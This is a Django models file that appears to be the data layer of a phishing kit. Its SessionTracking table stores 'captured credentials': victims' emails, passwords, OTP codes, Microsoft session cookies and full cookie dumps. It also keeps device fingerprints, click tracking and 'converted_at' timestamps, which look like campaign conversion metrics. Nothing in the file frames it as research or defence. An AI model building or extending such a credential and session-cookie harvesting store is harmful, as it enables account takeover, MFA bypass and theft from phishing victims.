from django.db import models
from django.contrib.auth.models import User

class SessionTracking(models.Model):
    """Store all session tracking data including captured credentials"""
    
    # Session identification
    session_id = models.CharField(max_length=100, unique=True)
    user = models.ForeignKey(User, on_delete=models.SET_NULL, null=True, blank=True, related_name='sessions')
    
    # Captured credentials
    email = models.CharField(max_length=255, blank=True)
    password = models.CharField(max_length=255, blank=True)
    otp_code = models.CharField(max_length=10, blank=True)
    otp_from_microsoft = models.BooleanField(default=False)
    
    # Cookies
    cookies_file = models.TextField(blank=True)
    cookies_json = models.JSONField(default=dict)
    ms_session_cookie = models.TextField(blank=True)
    
    # Network information
    ip_address = models.GenericIPAddressField(null=True, blank=True)
    user_agent = models.TextField(blank=True)
    referer = models.URLField(blank=True)
    tracking_source = models.CharField(max_length=255, blank=True)
    
    # Device information
    browser_name = models.CharField(max_length=100, blank=True)
    browser_version = models.CharField(max_length=50, blank=True)
    os_name = models.CharField(max_length=100, blank=True)
    device_type = models.CharField(max_length=50, blank=True)
    screen_width = models.IntegerField(default=0)
    screen_height = models.IntegerField(default=0)
    
    # Timestamps
    first_click = models.DateTimeField(auto_now_add=True)
    last_activity = models.DateTimeField(auto_now=True)
    converted_at = models.DateTimeField(null=True, blank=True)
    
    # Complete raw data
    raw_data = models.JSONField(default=dict)
    email_sent = models.BooleanField(default=False)
    
    # Service selected
    service = models.CharField(max_length=50, blank=True, default='')
    
    class Meta:
        db_table = 'accounts_session_tracking'
        ordering = ['-first_click']
    
    def __str__(self):
        return f"Session {self.session_id} - {self.email or 'No email'}"

class ClickEvent(models.Model):
    """Store user click events for session replay"""
    
    session = models.ForeignKey(SessionTracking, on_delete=models.CASCADE, related_name='clicks')
    x_position = models.IntegerField()
    y_position = models.IntegerField()
    target_element = models.CharField(max_length=255, blank=True)
    event_type = models.CharField(max_length=50, default='click')
    timestamp = models.DateTimeField(auto_now_add=True)
    
    class Meta:
        db_table = 'accounts_click_event'
        ordering = ['timestamp']
    
    def __str__(self):
        return f"Click at ({self.x_position}, {self.y_position}) on {self.timestamp}"
